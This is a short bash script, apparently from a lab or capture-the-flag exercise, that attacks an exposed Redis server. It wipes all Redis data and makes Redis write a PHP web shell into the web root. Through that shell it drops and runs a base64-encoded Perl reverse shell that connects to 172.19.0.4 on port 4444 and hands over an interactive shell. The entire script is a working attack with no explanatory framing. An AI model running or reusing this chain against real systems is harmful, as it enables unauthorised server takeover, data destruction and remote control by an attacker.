#!/bin/bash

redis-cli flushall
redis-cli set myshell "<?php echo system(\$_REQUEST['peaky']); ?>"
redis-cli config set dbfilename "shell.php"
redis-cli config set dir /var/www/html
redis-cli save

sleep 1

curl --data "peaky=echo+-n+dXNlIFNvY2tldDskaT0nMTcyLjE5LjAuNCc7JHA9NDQ0NDtzb2NrZXQoUyxQRl9JTkVULFNPQ0tfU1RSRUFNLGdldHByb3RvYnluYW1lKCd0Y3AnKSk7aWYoY29ubmVjdChTLHNvY2thZGRyX2luKCRwLGluZXRfYXRvbigkaSkpKSl7b3BlbihTVERJTiwnPiZTJyk7b3BlbihTVERPVVQsJz4mUycpO29wZW4oU1RERVJSLCc%2bJlMnKTtleGVjKCcvYmluL3NoIC1pJyk7fTs%3d+|+base64+-d+%3E+/tmp/lol.pl" http://localhost/shell.php
sleep 1
curl --data "peaky=perl+/tmp/lol.pl" http://localhost/shell.php
